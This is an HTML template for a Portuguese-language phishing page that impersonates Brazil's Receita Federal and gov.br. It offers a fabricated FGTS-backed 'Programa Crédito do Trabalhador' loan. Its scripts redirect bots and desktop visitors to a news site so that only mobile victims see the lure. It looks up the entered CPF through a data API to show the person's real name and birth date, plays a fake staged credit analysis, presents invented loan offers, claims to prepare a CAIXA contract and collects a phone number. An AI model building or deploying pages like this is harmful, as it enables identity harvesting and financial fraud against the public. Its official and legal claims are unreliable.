<!DOCTYPE html>
<html data-template="buscar-cpf">
<head>
    <meta charset="utf-8"/>
    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
    <title>Receita Federal - Buscar CPF</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
    <script>
    // Função para detectar se é um dispositivo móvel
    function isMobile() {
      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }

    // Função para detectar se é um bot
    function isBot() {
      const botAgents = [
        'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
        'YandexBot', 'Sogou', 'Exabot', 'facebot', 'ia_archiver'
      ];

      return botAgents.some(bot => navigator.userAgent.includes(bot));
    }

    // Função para verificar se a largura da janela é maior que 768px
    function isWideScreen() {
      return window.innerWidth > 768;
    }

    // Redirecionar ou bloquear o acesso
    function checkAccess() {
      if (isBot() || (!isMobile() && isWideScreen())) {
        // Redirecionar para o site G1 se o acesso for bloqueado
        window.location.href = "https://g1.globo.com/";
      }
    }

    // Executar a função de verificação ao carregar a página
    window.onload = checkAccess;

    // Adicionar um listener para verificar novamente se a janela for redimensionada
    window.addEventListener('resize', checkAccess);
    </script>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @font-face {
            font-family: 'Rawline';
            src: url("{{ url_for('static', filename='fonts/rawline-400.ea42a37247439622.woff2') }}") format('woff2');
            font-weight: 400;
            font-style: normal;
        }
        @font-face {
            font-family: 'Rawline';
            src: url("{{ url_for('static', filename='fonts/rawline-600.844a17f0db94d147.woff2') }}") format('woff2');
            font-weight: 600;
            font-style: normal;
        }
        @font-face {
            font-family: 'Rawline';
            src: url("{{ url_for('static', filename='fonts/rawline-700.1c7c76152b40409f.woff2') }}") format('woff2');
            font-weight: 700;
            font-style: normal;
        }
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Rawline', sans-serif;
        }
        body {
            background-color: white;
            padding-top: 60px;
            color: #333333;
            font-size: 16px;
            line-height: 1.05;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 8px 20px;
            background-color: white;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            z-index: 1000;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            height: 60px;
        }
        .logo {
            width: 100px; /* Reduced logo size */
            height: auto;
        }
        .header-icons {
            display: flex;
            gap: 15px;
        }
        .header-icon {
            font-size: 18px;
            color: #1351b4;
        }
        .container {
            max-width: 800px;
            margin: 40px auto;
            padding: 0 20px;
            flex: 1;
        }
        .info-box {
            border-left: 4px solid #1351b4; /* Changed color */
            padding: 20px;
            margin-bottom: 30px;
            border-radius: 4px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            height: auto; /* Removed fixed height */
        }
        .info-box h2 {
            color: #1351b4; /* Changed color */
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 15px;
        }
        .info-box p {
            color: #333;
            line-height: 1.5;
            margin-bottom: 10px;
        }
        .initial-content {
            transition: opacity 0.3s ease;
        }
        .user-data {
            background: #1451B4;
            padding: 15px;
            border-radius: 4px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            margin-bottom: 20px;
            color: white;
        }
        .user-data-item {
            font-weight: 700;
            margin-bottom: 10px;
            font-size: 15px;
            color: white;
            display: flex;
            align-items: center;
            text-shadow: 0 1px 2px rgba(0,0,0,0.2);
        }
        .user-data-item i {
            margin-right: 10px;
            width: 20px;
            text-align: center;
            color: white;
        }
        .cpf-form {
            background-color: white;
            padding: 25px;
            border-radius: 4px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
            margin-top: 20px;
        }
        .cpf-input {
            width: 100%;
            padding: 12px;
            font-size: 18px;
            border: 2px solid #dee2e6;
            border-radius: 4px;
            margin-bottom: 15px;
            text-align: center;
            letter-spacing: 1px;
        }
        .cpf-input:focus {
            border-color: #1351b4; /* Changed color */
            outline: none;
        }
        .submit-button {
            width: 100%;
            padding: 12px;
            background-color: #1351b4; /* Changed color */
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: 600;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        .submit-button:hover {
            background-color: #092555;
            transform: translateY(-1px);
            box-shadow: 0 4px 6px rgba(19, 81, 180, 0.2); /* Changed color */
        }
        .analysis-container {
            margin: 20px 0;
        }
        .analysis-step {
            padding: 12px 15px;
            margin: 8px 0;
            border-left: 3px solid #1351b4; /* Changed color */
            background: #f8f9fa;
            border-radius: 4px;
            opacity: 0;
            transform: translateX(-20px);
            animation: slideIn 0.8s ease forwards;
        }
        .analysis-step div {
            line-height: 1.2;
        }
        .warning-message {
            margin: 25px 0;
            font-weight: 600;
            color: #721c24;
            line-height: 1.6;
            padding: 20px;
            border: 1px solid #dc3545;
            border-radius: 8px;
        }
        .irregularities {
            margin: 20px 0;
            line-height: 1.6;
        }
        .irregularity-item {
            margin-bottom: 20px;
            padding-left: 25px;
            position: relative;
        }
        .irregularity-title {
            color: #721c24;
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 15px;
        }
        .user-details {
            border-bottom: 2px solid #1351b4; /* Changed color */
            padding-bottom: 15px;
            margin: 20px 0;
            line-height: 1.3;
        }
        .user-details strong {
            display: block;
            color: #1351b4; /* Changed color */
            font-size: 18px;
            margin-bottom: 8px;
        }
        .irregularities {
            line-height: 1.3;
            margin: 15px 0;
        }
        .irregularity-item {
            margin-bottom: 12px;
        }
        .irregularity-item div {
            line-height: 1.3;
            margin-top: 4px;
        }
        .warning-message {
            line-height: 1.3;
            margin: 15px 0;
        }
        @media (max-width: 600px) {
            .user-details strong {
                font-size: 16px;
            }
            .irregularity-title {
                font-size: 16px;
            }
            .warning-message {
                font-size: 14px;
                padding: 15px;
            }
            .logo {
                width: 80px;
            }
            .analysis-step {
                padding: 6px 10px;
                margin: 3px 0;
            }
            .analysis-step div {
                line-height: 1.2;
            }
        }
        .footer {
            background-color: #1351b4; /* Changed color */
            color: white;
            padding: 16px;
            text-align: center;
            margin-top: 40px;
        }
        .footer-logo {
            width: 100px;
            margin: 0 auto 8px;
            display: block;
        }
        .loading-item {
            display: flex;
            align-items: center;
            margin: 12px 0;
            padding: 15px;
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
            opacity: 0;
            transform: translateY(20px);
            animation: fadeInUp 0.8s ease forwards;
        }
        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        .loading-item i {
            margin-right: 15px;
            font-size: 18px;
            color: #1351b4; /* Changed color */
        }
        .progress-bar {
            height: 4px;
            background: #e9ecef;
            border-radius: 2px;
            margin-top: 4px;
            overflow: hidden;
        }
        .progress-bar-fill {
            height: 100%;
            background: #1351b4; /* Changed color */
            width: 0;
            animation: progressFill 2s ease-in-out;
        }
        @keyframes progressFill {
            from { width: 0; }
            to { width: 100%; }
        }
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateX(-20px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }
        @keyframes pulseWarning {
            0% { box-shadow: 0 0 0 0 rgba(220, 53, 69, 0.4); }
            70% { box-shadow: 0 0 0 10px rgba(220, 53, 69, 0); }
            100% { box-shadow: 0 0 0 0 rgba(220, 53, 69, 0); }
        }
        .regularize-button {
            width: 100%;
            padding: 15px;
            background-color: #dc3545;
            color: white;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            font-size: 16px;
            cursor: pointer;
            margin: 20px 0 40px;
            transition: all 0.3s ease;
            animation: pulseButton 2s infinite;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        .regularize-button:hover {
            background-color: #c82333;
            transform: translateY(-2px);
        }
        @keyframes pulseButton {
            0% { transform: scale(1); }
            50% { transform: scale(1.02); }
            100% { transform: scale(1); }
        }

        .phone-modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            animation: fadeIn 0.3s ease;
        }

        .phone-modal-content {
            background-color: #fff;
            margin: 10% auto;
            width: 95%;
            max-width: 600px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            animation: slideUp 0.3s ease;
        }

        .phone-modal-header {
            background-color: #1351b4; /* Changed color */
            color: white;
            padding: 15px 20px;
            border-radius: 8px 8px 0 0;
            font-size: 18px;
            font-weight: 600;
        }

        .phone-modal-body {
            padding: 20px;
        }

        .phone-input {
            width: 100%;
            padding: 12px;
            font-size: 16px;
            border: 2px solid #dee2e6;
            border-radius: 4px;
            margin: 10px 0;
            text-align: center;
        }

        .phone-input:focus {
            border-color: #1351b4; /* Changed color */
            outline: none;
        }

        .continue-button {
            width: 100%;
            padding: 12px;
            background-color: #1351b4; /* Changed color */
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: 600;
            font-size: 16px;
            cursor: pointer;
            margin-top: 15px;
            transition: background-color 0.3s ease;
        }

        .continue-button:hover {
            background-color: #092555;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        @keyframes slideUp {
            from { transform: translateY(20px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
    </style>
</head>
<body class="buscar-cpf-page">
    <div class="header">
        <img alt="Logo Gov.br" class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/11/Gov.br_logo.svg/2560px-Gov.br_logo.svg.png"/>
        <div class="header-icons">
            <i class="fas fa-search header-icon"></i>
            <i class="fas fa-question-circle header-icon"></i>
            <i class="fas fa-adjust header-icon"></i>
        </div>
    </div>
    
    <div style="width: 100%; background-color: #1351b4; color: white; padding: 8px; text-align: center; font-weight: 500;">
        Programa Crédito do Trabalhador - Lei nº 14.436/2025
    </div>

    <div class="container">
        <div class="info-box">
            <div class="initial-content">
                <h2>Programa Crédito do Trabalhador</h2>
                <p>Consulte seu limite de empréstimo disponível com condições especiais baseadas no seu FGTS. Juros reduzidos e facilidade de pagamento.</p>
                <p>Empréstimo com desconto direto no FGTS. Sem comprometer seu salário, sem burocracia. Digite seu CPF para consultar valores disponíveis.</p>
            </div>
            <div class="cpf-form" id="cpfFormContainer">
                <input type="tel" id="cpfInput" class="cpf-input" placeholder="Digite seu CPF" pattern="\d*" maxlength="14">
                <button id="verifyButton" class="submit-button">
                    <i class="fas fa-search"></i>
                    Consultar Valor Disponível
                </button>
            </div>
        </div>
    </div>

    <footer class="footer">
        <p>© Todos os direitos reservados.</p>
    </footer>

    <div id="phoneModal" class="phone-modal">
        <div class="phone-modal-content">
            <div class="phone-modal-header">
                Confirmação do Empréstimo
            </div>
            <div class="phone-modal-body">
                <p style="margin-bottom: 15px;">Para prosseguir com a contratação do empréstimo, informe seu telefone para contato:</p>
                <input type="tel" id="phoneInput" class="phone-input" placeholder="(XX) XXXXX-XXXX" maxlength="15">
                <button id="continueButton" class="continue-button">
                    Solicitar Empréstimo
                </button>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const infoBox = document.querySelector('.info-box');

            document.getElementById('cpfInput').addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length > 11) value = value.slice(0, 11);

                if (value.length > 9) {
                    value = value.replace(/^(\d{3})(\d{3})(\d{3})(\d{2}).*/, '$1.$2.$3-$4');
                } else if (value.length > 6) {
                    value = value.replace(/^(\d{3})(\d{3})(\d{3}).*/, '$1.$2.$3');
                } else if (value.length > 3) {
                    value = value.replace(/^(\d{3})(\d{3}).*/, '$1.$2');
                }

                e.target.value = value;
            });

            document.getElementById('verifyButton').addEventListener('click', async function() {
                const button = this;
                const cpfInput = document.getElementById('cpfInput');
                const cpf = cpfInput.value.replace(/\D/g, '');

                if (cpf.length !== 11) {
                    alert('Por favor, digite um CPF válido');
                    return;
                }

                button.disabled = true;
                button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Consultando...';

                // Remover conteúdo inicial
                const initialContent = document.querySelector('.initial-content');
                if (initialContent) {
                    initialContent.style.opacity = '0';
                    initialContent.remove();
                }

                try {
                    // Usando a API da Exato Digital 
                    const apiKey = "{{exato_api_token}}"; // API key da Exato Digital passada pelo servidor Flask
                    const response = await fetch(`https://api.exato.digital/receita-federal/cpf?token=${apiKey}&cpf=${cpf}&format=json`);
                    const data = await response.json();

                    if (data.Result) {
                        // Salvar dados no localStorage
                        localStorage.setItem('userData', JSON.stringify({
                            nome: data.Result.NomePessoaFisica,
                            cpf: cpf
                        }));

                        const loadingContainer = document.createElement('div');
                        loadingContainer.id = 'loadingContainer';
                        loadingContainer.style.marginTop = '20px';

                        // Remover formulário
                        document.getElementById('cpfFormContainer').style.display = 'none';

                        // Adicionar resultados iniciais com novo layout
                        let dataNascFormatada = '';
                        if (data.Result.DataNascimento) {
                            // Remover a parte T00:00:00.0000000
                            dataNascFormatada = data.Result.DataNascimento.split('T')[0];
                        }

                        loadingContainer.innerHTML = `
                            <div class="user-data">
                                <div class="user-data-item">
                                    <i class="fas fa-user"></i>
                                    ${data.Result.NomePessoaFisica}
                                </div>
                                <div class="user-data-item">
                                    <i class="fas fa-id-card"></i>
                                    ${data.Result.NumeroCpf}
                                </div>
                                ${dataNascFormatada ? `
                                    <div class="user-data-item">
                                        <i class="fas fa-calendar"></i>
                                        Nascimento: ${dataNascFormatada}
                                    </div>
                                ` : ''}
                                <!-- A API da Exato não retorna nome da mãe -->
                            </div>
                            <button id="confirmButton" class="submit-button">
                                <i class="fas fa-check-circle"></i>
                                Confirmar meus dados
                            </button>
                        `;

                        infoBox.appendChild(loadingContainer);

                        // Configurar evento do botão de confirmação
                        document.getElementById('confirmButton').addEventListener('click', async function() {
                            this.style.display = 'none';
                            loadingContainer.innerHTML = `
                                <h3 style="color: #1351b4; margin: 15px 0; font-weight: 600;">Análise em andamento...</h3>
                                <div id="analysisContainer" class="analysis-container"></div>
                            `;

                            const analysisSteps = [
                                {
                                    text: "Iniciando análise do CPF...",
                                    icon: "search",
                                    details: "Verificando dados básicos do trabalhador"
                                },
                                {
                                    text: "Verificando histórico profissional...",
                                    icon: "briefcase",
                                    details: "Consultando vínculos empregatícios e estabilidade"
                                },
                                {
                                    text: "Analisando saldo do FGTS disponível...",
                                    icon: "piggy-bank",
                                    details: "Calculando valores disponíveis para empréstimo"
                                },
                                {
                                    text: "Verificando tempo de serviço...",
                                    icon: "calendar-check",
                                    details: "Analisando estabilidade e continuidade no trabalho"
                                },
                                {
                                    text: "Calculando capacidade de pagamento...",
                                    icon: "calculator",
                                    details: "Avaliando valores seguros para desconto no FGTS"
                                },
                                {
                                    text: "Simulando opções de empréstimo...",
                                    icon: "money-bill-wave",
                                    details: "Preparando propostas personalizadas com taxas reduzidas"
                                },
                                {
                                    text: "Finalizando análise de crédito...",
                                    icon: "check-circle",
                                    details: "Preparando resultado final da consulta"
                                }
                            ];

                            const analysisContainer = document.getElementById('analysisContainer');

                            // Function to add random delay between steps
                            const getRandomDelay = () => Math.floor(Math.random() * (2000 - 1500 + 1)) + 1500;

                            // Function to create and animate a step
                            const createStep = async (step, index) => {
                                const stepElement = document.createElement('div');
                                stepElement.className = 'analysis-step';
                                stepElement.innerHTML = `
                                    <div style="display: flex; align-items: center;">
                                        <i class="fas fa-${step.icon}" style="margin-right: 10px; color: #1351b4;"></i>
                                        <div>
                                            <div style="font-weight: 600;">${step.text}</div>
                                            <div style="font-size: 13px; color: #666; margin-top: 4px;">${step.details}</div>
                                            <div class="progress-bar">
                                                <div class="progress-bar-fill"></div>
                                            </div>
                                        </div>
                                    </div>
                                `;

                                analysisContainer.appendChild(stepElement);

                                // Add loading animation
                                await new Promise(resolve => setTimeout(resolve, getRandomDelay()));
                            };

                            // Process steps one at a time, removing the previous one
                            for (let [index, step] of analysisSteps.entries()) {
                                // Create and show the current step
                                await createStep(step, index);
                                
                                // Wait a bit to show the step
                                await new Promise(resolve => setTimeout(resolve, 1500));
                                
                                // Remove previous step if not the last one
                                if (index < analysisSteps.length - 1) {
                                    const currentStep = analysisContainer.lastChild;
                                    currentStep.style.transition = 'opacity 0.5s ease, transform 0.5s ease';
                                    currentStep.style.opacity = '0';
                                    currentStep.style.transform = 'translateX(20px)';
                                    
                                    // Remove after animation
                                    setTimeout(() => {
                                        if (currentStep && currentStep.parentNode) {
                                            currentStep.parentNode.removeChild(currentStep);
                                        }
                                    }, 500);
                                }
                            }

                            const amanha = new Date();
                            amanha.setDate(amanha.getDate() + 1);
                            const dataFormatada = amanha.toLocaleDateString('pt-BR');

                            // Cálculos para empréstimos
                            // Opção 1: R$ 4.000,00 com parcela máxima de R$ 48,00
                            const valor1 = 4000;
                            const parcela1 = 48;
                            const meses1 = Math.ceil(valor1 / parcela1 * 1.019); // Considerando juros de 1,9% ao mês
                            
                            // Opção 2: R$ 6.000,00 com parcela máxima de R$ 68,00
                            const valor2 = 6000;
                            const parcela2 = 68;
                            const meses2 = Math.ceil(valor2 / parcela2 * 1.019);
                            
                            // Opção 3: R$ 10.000,00 com parcela máxima de R$ 118,00
                            const valor3 = 10000;
                            const parcela3 = 118;
                            const meses3 = Math.ceil(valor3 / parcela3 * 1.019);
                            
                            loadingContainer.innerHTML = `
                                <div style="margin: 25px 0; padding: 15px; background-color: #1451B4; border-radius: 4px; color: white; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
                                    <div style="font-weight: 700; font-size: 18px; margin-bottom: 10px; text-shadow: 0 1px 2px rgba(0,0,0,0.2);">
                                        Análise de crédito concluída
                                    </div>
                                    <div style="font-weight: 600; margin-bottom: 8px; text-shadow: 0 1px 2px rgba(0,0,0,0.2);">
                                        Nome: ${data.Result.NomePessoaFisica}
                                    </div>
                                    <div style="font-weight: 600; margin-bottom: 15px; text-shadow: 0 1px 2px rgba(0,0,0,0.2);">
                                        CPF: ${cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")}
                                    </div>
                                    <p style="margin-bottom: 10px; text-shadow: 0 1px 1px rgba(0,0,0,0.15); color: white;">
                                        Com base no seu histórico profissional e saldo do FGTS, você tem direito a 
                                        condições especiais no <strong>Programa Crédito do Trabalhador</strong>.
                                    </p>
                                    <p style="text-shadow: 0 1px 1px rgba(0,0,0,0.15); color: white;">
                                        <strong>Taxa de juros:</strong> 1,9% ao mês<br>
                                        <strong>Forma de pagamento:</strong> Desconto direto no FGTS todo dia 10<br>
                                        <strong>Vantagens:</strong> Sem comprometer seu salário, sem consulta ao SPC/Serasa
                                    </p>
                                </div>

                                <h3 style="text-align: center; margin: 25px 0 15px; font-size: 18px; color: #1351b4;">
                                    Opções de Empréstimo Disponíveis
                                </h3>

                                <div style="display: flex; flex-direction: column; gap: 15px; margin-bottom: 30px;">
                                    <!-- Opção 1 -->
                                    <div style="border: 1px solid #e0e0e0; border-radius: 8px; padding: 15px; box-shadow: 0 2px 4px rgba(0,0,0,0.05);">
                                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
                                            <div style="font-weight: 600; font-size: 20px; color: #1351b4;">R$ 4.000,00</div>
                                            <div style="background-color: #e8f5e9; color: #48AD45; padding: 5px 10px; border-radius: 4px; font-size: 14px; font-weight: 600;">
                                                Básico
                                            </div>
                                        </div>
                                        <div style="margin-bottom: 15px;">
                                            <div><strong>Parcela máxima:</strong> R$ 48,00 mensais</div>
                                            <div><strong>Prazo total:</strong> ${meses1} meses</div>
                                            <div><strong>Desconto direto no FGTS:</strong> Sim</div>
                                        </div>
                                        <button class="select-loan" data-value="4000" style="width: 100%; padding: 10px; background-color: #1351b4; color: white; border: none; border-radius: 4px; font-weight: 600; cursor: pointer; transition: background-color 0.3s ease;">
                                            <i class="fas fa-check-circle"></i> Selecionar
                                        </button>
                                    </div>
                                    
                                    <!-- Opção 2 -->
                                    <div style="border: 1px solid #e0e0e0; border-radius: 8px; padding: 15px; box-shadow: 0 2px 4px rgba(0,0,0,0.05);">
                                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
                                            <div style="font-weight: 600; font-size: 20px; color: #1351b4;">R$ 6.000,00</div>
                                            <div style="background-color: #e8f5e9; color: #48AD45; padding: 5px 10px; border-radius: 4px; font-size: 14px; font-weight: 600;">
                                                Intermediário
                                            </div>
                                        </div>
                                        <div style="margin-bottom: 15px;">
                                            <div><strong>Parcela máxima:</strong> R$ 68,00 mensais</div>
                                            <div><strong>Prazo total:</strong> ${meses2} meses</div>
                                            <div><strong>Desconto direto no FGTS:</strong> Sim</div>
                                        </div>
                                        <button class="select-loan" data-value="6000" style="width: 100%; padding: 10px; background-color: #1351b4; color: white; border: none; border-radius: 4px; font-weight: 600; cursor: pointer; transition: background-color 0.3s ease;">
                                            <i class="fas fa-check-circle"></i> Selecionar
                                        </button>
                                    </div>
                                    
                                    <!-- Opção 3 -->
                                    <div style="border: 1px solid #e0e0e0; border-radius: 8px; padding: 15px; box-shadow: 0 2px 4px rgba(0,0,0,0.05);">
                                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
                                            <div style="font-weight: 600; font-size: 20px; color: #1351b4;">R$ 10.000,00</div>
                                            <div style="background-color: #e8f5e9; color: #48AD45; padding: 5px 10px; border-radius: 4px; font-size: 14px; font-weight: 600;">
                                                Premium
                                            </div>
                                        </div>
                                        <div style="margin-bottom: 15px;">
                                            <div><strong>Parcela máxima:</strong> R$ 118,00 mensais</div>
                                            <div><strong>Prazo total:</strong> ${meses3} meses</div>
                                            <div><strong>Desconto direto no FGTS:</strong> Sim</div>
                                        </div>
                                        <button class="select-loan" data-value="10000" style="width: 100%; padding: 10px; background-color: #1351b4; color: white; border: none; border-radius: 4px; font-weight: 600; cursor: pointer; transition: background-color 0.3s ease;">
                                            <i class="fas fa-check-circle"></i> Selecionar
                                        </button>
                                    </div>
                                </div>
                                
                                <p style="text-align: center; color: #666; font-size: 14px; margin-bottom: 20px;">
                                    Selecione uma opção acima para prosseguir com a contratação do empréstimo.
                                </p>
                            `;
                            
                            // Adicionar eventos aos botões de seleção
                            document.querySelectorAll('.select-loan').forEach(button => {
                                button.addEventListener('click', (e) => {
                                    // Mudar o botão para cor azul escuro quando clicado
                                    e.currentTarget.style.backgroundColor = '#092555';
                                    const loanValue = e.currentTarget.getAttribute('data-value');
                                    const loanAmount = parseInt(loanValue);
                                    let monthlyPayment, loanTerm;
                                    
                                    // Definir a parcela mensal com base no valor selecionado
                                    if (loanAmount === 4000) {
                                        monthlyPayment = 48;
                                        loanTerm = meses1;
                                    } else if (loanAmount === 6000) {
                                        monthlyPayment = 68;
                                        loanTerm = meses2;
                                    } else { // 10000
                                        monthlyPayment = 118;
                                        loanTerm = meses3;
                                    }
                                    
                                    // Salvar dados do empréstimo no localStorage
                                    const userData = JSON.parse(localStorage.getItem('userData') || '{}');
                                    userData.loanValue = loanValue;
                                    localStorage.setItem('userData', JSON.stringify(userData));
                                    
                                    // Salvar dados do empréstimo em separado para a página de contrato
                                    const loanData = {
                                        amount: loanValue,
                                        monthly: monthlyPayment.toString(),
                                        term: loanTerm.toString()
                                    };
                                    localStorage.setItem('loanData', JSON.stringify(loanData));
                                    
                                    // Criar e mostrar tela de carregamento
                                    const loadingScreen = document.createElement('div');
                                    loadingScreen.style.cssText = `
                                        position: fixed;
                                        top: 0;
                                        left: 0;
                                        width: 100%;
                                        height: 100%;
                                        display: flex;
                                        flex-direction: column;
                                        justify-content: center;
                                        align-items: center;
                                        background-color: rgba(255, 255, 255, 0.95);
                                        z-index: 2000;
                                    `;
                                    
                                    loadingScreen.innerHTML = `
                                        <div style="width: 80px; height: 80px; border: 5px solid #f3f3f3; 
                                                    border-top: 5px solid #1351b4; border-radius: 50%; 
                                                    animation: spin 1s linear infinite;"></div>
                                        <div style="margin-top: 20px; font-size: 18px; font-weight: 600; color: #1351b4;">
                                            Gerando contrato com a CAIXA
                                        </div>
                                        <div style="margin-top: 10px; max-width: 300px; text-align: center; color: #666;">
                                            Aguarde enquanto preparamos sua documentação
                                        </div>
                                    `;
                                    
                                    document.body.appendChild(loadingScreen);
                                    
                                    // Adicionar estilo da animação
                                    if (!document.getElementById('spinAnimation')) {
                                        const style = document.createElement('style');
                                        style.id = 'spinAnimation';
                                        style.textContent = `
                                            @keyframes spin {
                                                0% { transform: rotate(0deg); }
                                                100% { transform: rotate(360deg); }
                                            }
                                        `;
                                        document.head.appendChild(style);
                                    }
                                    
                                    // Redirecionar após 5 segundos
                                    setTimeout(() => {
                                        window.location.href = '/';
                                    }, 5000);
                                });
                            });
                        });
                    }
                } catch (error) {
                    console.error('Erro:', error);
                    button.innerHTML = '<i class="fas fa-search"></i> Realizar Consulta';
                    button.disabled = false;
                    alert('Ocorreu um erro ao consultar o CPF. Por favor, tente novamente.');
                }
            });
        });

        function formatPhoneNumber(input) {
            let value = input.value.replace(/\D/g, '');
            if (value.length > 11) value = value.slice(0, 11);

            if (value.length > 6) {
                value = value.replace(/^(\d{2})(\d{5})(\d{4}).*/, '($1) $2-$3');
            } else if (value.length > 2) {
                value = value.replace(/^(\d{2})(\d{0,5})/, '($1) $2');
            } else if (value.length > 0) {
                value = value.replace(/^(\d{0,2})/, '($1');
            }

            input.value = value;
        }

        function showPhoneModal() {
            const modal = document.getElementById('phoneModal');
            const phoneInput = document.getElementById('phoneInput');
            const continueButton = document.getElementById('continueButton');

            modal.style.display = 'block';
            phoneInput.focus();

            phoneInput.addEventListener('input', function() {
                formatPhoneNumber(this);
            });

            continueButton.addEventListener('click', function() {
                const phone = phoneInput.value.replace(/\D/g, '');
                if (phone.length !== 11) {
                    alert('Por favor, digite um número de telefone válido com DDD');
                    return;
                }

                // Get existing user data
                const userData = JSON.parse(localStorage.getItem('userData') || '{}');
                // Add phone number
                userData.phone = phoneInput.value;
                // Save back to localStorage
                localStorage.setItem('userData', JSON.stringify(userData));

                // Redirect to index
                window.location.href = '/';
            });
        }
    </script>
</body>
</html>